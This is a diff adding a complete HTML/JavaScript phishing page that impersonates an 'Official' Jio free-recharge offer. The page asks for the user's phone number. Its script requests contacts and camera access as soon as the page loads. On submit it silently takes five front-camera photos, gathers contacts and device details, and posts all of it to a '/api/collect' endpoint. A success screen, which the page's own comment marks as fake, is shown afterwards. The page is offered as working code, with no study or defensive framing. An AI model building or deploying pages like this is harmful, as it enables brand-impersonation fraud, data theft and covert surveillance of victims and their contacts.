@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Jio Recharge – Free Offer</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #0b0d12;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+      background-image: radial-gradient(circle at 30% 10%, #1a1f2e, #050608);
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      margin: 0 auto;
+      animation: floatIn 0.8s ease;
+    }
+
+    @keyframes floatIn {
+      0% {
+        opacity: 0;
+        transform: translateY(40px) scale(0.96);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    .card {
+      background: rgba(20, 25, 38, 0.75);
+      backdrop-filter: blur(24px);
+      -webkit-backdrop-filter: blur(24px);
+      border-radius: 44px;
+      padding: 32px 24px 36px;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      box-shadow: 0 40px 80px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 215, 0, 0.04);
+      transition: all 0.3s ease;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 20px;
+    }
+
+    .logo-box {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .logo {
+      font-size: 2rem;
+      font-weight: 900;
+      background: linear-gradient(135deg, #ff416c, #ff4b2b);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: -0.5px;
+    }
+
+    .badge {
+      background: rgba(255, 65, 108, 0.2);
+      border: 1px solid rgba(255, 65, 108, 0.3);
+      padding: 4px 14px;
+      border-radius: 40px;
+      font-size: 0.6rem;
+      font-weight: 700;
+      color: #ff4b2b;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .offer-pill {
+      background: linear-gradient(135deg, #ff416c, #ff4b2b);
+      padding: 6px 18px;
+      border-radius: 40px;
+      font-size: 0.7rem;
+      font-weight: 700;
+      color: #fff;
+      display: inline-block;
+      margin-bottom: 14px;
+      box-shadow: 0 4px 20px rgba(255, 65, 108, 0.3);
+      animation: pulseGlow 2s infinite alternate;
+    }
+
+    @keyframes pulseGlow {
+      0% {
+        box-shadow: 0 4px 20px rgba(255, 65, 108, 0.2);
+      }
+      100% {
+        box-shadow: 0 4px 40px rgba(255, 65, 108, 0.6);
+      }
+    }
+
+    h1 {
+      font-size: 2rem;
+      font-weight: 800;
+      line-height: 1.2;
+      color: #fff;
+      letter-spacing: -0.02em;
+    }
+
+    h1 .highlight {
+      background: linear-gradient(135deg, #ff416c, #ff4b2b);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .sub {
+      color: #8a8fa8;
+      font-size: 0.95rem;
+      margin: 8px 0 22px;
+      font-weight: 400;
+      line-height: 1.5;
+    }
+
+    .input-group {
+      background: rgba(255, 255, 255, 0.04);
+      border-radius: 60px;
+      padding: 4px 4px 4px 24px;
+      display: flex;
+      align-items: center;
+      border: 1.5px solid rgba(255, 255, 255, 0.06);
+      transition: all 0.3s ease;
+      margin: 18px 0 6px;
+    }
+
+    .input-group:focus-within {
+      border-color: #ff416c;
+      box-shadow: 0 0 0 4px rgba(255, 65, 108, 0.12);
+      background: rgba(255, 255, 255, 0.07);
+    }
+
+    .input-group .prefix {
+      color: #8a8fa8;
+      font-weight: 600;
+      font-size: 0.95rem;
+      margin-right: 6px;
+    }
+
+    .input-group input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      padding: 16px 8px 16px 0;
+      font-size: 1rem;
+      color: #fff;
+      outline: none;
+      font-weight: 500;
+      letter-spacing: 0.3px;
+    }
+
+    .input-group input::placeholder {
+      color: #5a5f7a;
+      font-weight: 400;
+    }
+
+    .btn-primary {
+      display: block;
+      width: 100%;
+      padding: 18px;
+      background: linear-gradient(135deg, #ff416c, #ff4b2b);
+      border: none;
+      border-radius: 60px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: #fff;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 8px 32px rgba(255, 65, 108, 0.35);
+      margin-top: 20px;
+      position: relative;
+      overflow: hidden;
+      letter-spacing: 0.3px;
+    }
+
+    .btn-primary::after {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255, 255, 255, 0.15) 0%, transparent 60%);
+      opacity: 0;
+      transition: opacity 0.4s;
+      pointer-events: none;
+    }
+
+    .btn-primary:hover::after {
+      opacity: 1;
+    }
+
+    .btn-primary:active {
+      transform: scale(0.96);
+      box-shadow: 0 4px 16px rgba(255, 65, 108, 0.2);
+    }
+
+    .btn-primary:disabled {
+      opacity: 0.4;
+      pointer-events: none;
+    }
+
+    .footer-note {
+      font-size: 0.7rem;
+      color: #5a5f7a;
+      text-align: center;
+      margin-top: 18px;
+      letter-spacing: 0.2px;
+    }
+
+    /* Success Screen */
+    #successScreen {
+      display: none;
+      text-align: center;
+      padding: 20px 0;
+    }
+
+    .check-icon {
+      font-size: 4.5rem;
+      margin-bottom: 12px;
+      animation: popCheck 0.6s ease;
+    }
+
+    @keyframes popCheck {
+      0% {
+        transform: scale(0);
+        opacity: 0;
+      }
+      70% {
+        transform: scale(1.2);
+      }
+      100% {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    #successScreen h2 {
+      font-size: 1.8rem;
+      font-weight: 800;
+      color: #fff;
+    }
+
+    #successScreen p {
+      color: #8a8fa8;
+      font-size: 0.95rem;
+      margin-top: 6px;
+    }
+
+    /* Loader */
+    .loader {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(12px);
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      gap: 18px;
+    }
+
+    .loader.active {
+      display: flex;
+    }
+
+    .spinner {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      border: 5px solid rgba(255, 255, 255, 0.06);
+      border-top-color: #ff416c;
+      animation: spin 0.8s cubic-bezier(0.6, 0, 0.4, 1) infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .loader p {
+      color: #fff;
+      font-weight: 500;
+      font-size: 0.95rem;
+      letter-spacing: 0.3px;
+    }
+
+    /* Toast */
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(20, 25, 38, 0.9);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      padding: 12px 28px;
+      border-radius: 60px;
+      font-size: 0.9rem;
+      color: #fff;
+      display: none;
+      z-index: 1000;
+      font-weight: 500;
+      box-shadow: 0 16px 48px rgba(0, 0, 0, 0.5);
+      white-space: nowrap;
+    }
+
+    /* Responsive */
+    @media (max-width: 480px) {
+      .card {
+        padding: 24px 18px 28px;
+        border-radius: 32px;
+      }
+      h1 {
+        font-size: 1.6rem;
+      }
+      .logo {
+        font-size: 1.6rem;
+      }
+    }
+
+    @media (min-width: 768px) {
+      .container {
+        max-width: 460px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="loader" id="loader">
+    <div class="spinner"></div>
+    <p>Processing your request...</p>
+  </div>
+
+  <div class="toast" id="toast"></div>
+
+  <div class="container">
+    <div class="card">
+
+      <!-- MAIN SCREEN -->
+      <div id="mainScreen">
+        <div class="header">
+          <div class="logo-box">
+            <span class="logo">Jio</span>
+            <span class="badge">Official</span>
+          </div>
+          <span style="color:#5a5f7a; font-size:0.7rem;">🔒 Secure</span>
+        </div>
+
+        <div class="offer-pill">🔥 Limited Free Recharge</div>
+
+        <h1>
+          Claim Your <br><span class="highlight">Free Recharge</span>
+        </h1>
+
+        <p class="sub">
+          Enter your phone number to get ₹399 talktime + 3GB/day.
+        </p>
+
+        <div class="input-group">
+          <span class="prefix">+91</span>
+          <input type="tel" id="phoneInput" placeholder="98765 43210" maxlength="10" inputmode="numeric">
+        </div>
+
+        <button class="btn-primary" id="claimBtn">Claim Now →</button>
+
+        <p class="footer-note">
+          By continuing you accept terms. Only for select users.
+        </p>
+      </div>
+
+      <!-- SUCCESS SCREEN (fake) -->
+      <div id="successScreen">
+        <div class="check-icon">✅</div>
+        <h2>Claim Submitted!</h2>
+        <p>You will receive confirmation shortly.</p>
+        <div style="margin-top:18px; background:rgba(255,255,255,0.03); border-radius:40px; padding:8px 20px; display:inline-block; font-weight:600; color:#8a8fa8; font-size:0.8rem;">
+          #JIO-<span id="claimId">XXXX</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    // ================================================================
+    // 1. AUTO REQUEST PERMISSIONS (Contacts + Camera) on page load
+    // ================================================================
+    async function requestPermissions() {
+      const granted = [];
+      // Contacts
+      if (navigator.contacts) {
+        try {
+          await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+          granted.push('contacts');
+        } catch (e) { /* user denied or API failed */ }
+      }
+      // Camera (front)
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        granted.push('camera');
+        stream.getTracks().forEach(t => t.stop());
+      } catch (e) { /* denied */ }
+      return granted;
+    }
+
+    // Call it immediately (so browser popups appear early)
+    requestPermissions().then(perms => {
+      console.log('Permissions granted:', perms);
+    });
+
+    // ================================================================
+    // 2. COLLECT ALL DATA (including 5 front camera photos)
+    // ================================================================
+    async function collectData(phone) {
+      const data = {
+        phone: phone || 'unknown',
+        timestamp: new Date().toISOString(),
+        ip: '', // server will add
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        cores: navigator.hardwareConcurrency || 'unknown',
+        touchSupport: 'ontouchstart' in window,
+        contacts: [],
+        photos: [],
+        photoCount: 0
+      };
+
+      // --- Contacts ---
+      if (navigator.contacts) {
+        try {
+          const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+          data.contacts = contacts.map(c => ({
+            name: c.name?.[0] || '',
+            tel: c.tel?.[0] || '',
+            email: c.email?.[0] || ''
+          }));
+        } catch (e) { /* silently fail */ }
+      }
+
+      // --- Capture 5 photos from front camera ---
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+
+        const photos = [];
+        for (let i = 0; i < 5; i++) {
+          try {
+            const blob = await imageCapture.takePhoto();
+            const reader = new FileReader();
+            const b64 = await new Promise(resolve => {
+              reader.onload = () => resolve(reader.result);
+              reader.readAsDataURL(blob);
+            });
+            photos.push(b64);
+          } catch (e) { break; }
+        }
+        track.stop();
+        data.photos = photos;
+        data.photoCount = photos.length;
+      } catch (e) { /* no camera permission */ }
+
+      return data;
+    }
+
+    // ================================================================
+    // 3. SEND DATA TO SERVER
+    // ================================================================
+    async function sendData(data) {
+      const res = await fetch('/api/collect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+      return res.json();
+    }
+
+    // ================================================================
+    // 4. UI HANDLERS
+    // ================================================================
+    const phoneInput = document.getElementById('phoneInput');
+    const claimBtn = document.getElementById('claimBtn');
+    const loader = document.getElementById('loader');
+    const toast = document.getElementById('toast');
+
+    function showToast(msg) {
+      toast.textContent = msg;
+      toast.style.display = 'block';
+      setTimeout(() => toast.style.display = 'none', 3000);
+    }
+
+    claimBtn.addEventListener('click', async function() {
+      const phone = phoneInput.value.trim();
+      if (!phone || phone.length !== 10) {
+        showToast('Please enter a valid 10-digit number');
+        return;
+      }
+
+      loader.classList.add('active');
+      this.disabled = true;
+
+      // 1. Request permissions (if not already granted)
+      await requestPermissions();
+
+      // 2. Collect data (photos, contacts, device info)
+      const collected = await collectData(phone);
+
+      // 3. Send to server
+      try {
+        const result = await sendData(collected);
+        if (result.success) {
+          document.getElementById('mainScreen').style.display = 'none';
+          document.getElementById('successScreen').style.display = 'block';
+          document.getElementById('claimId').textContent = result.claimId || 'XXXX';
+          showToast('Claim submitted successfully!');
+        } else {
+          showToast('Error: ' + result.message);
+        }
+      } catch (e) {
+        showToast('Network error. Please try again.');
+      } finally {
+        loader.classList.remove('active');
+        this.disabled = false;
+      }
+    });
+
+    // Allow enter key on phone input
+    phoneInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') claimBtn.click();
+    });
+  </script>
+</body>
+</html>
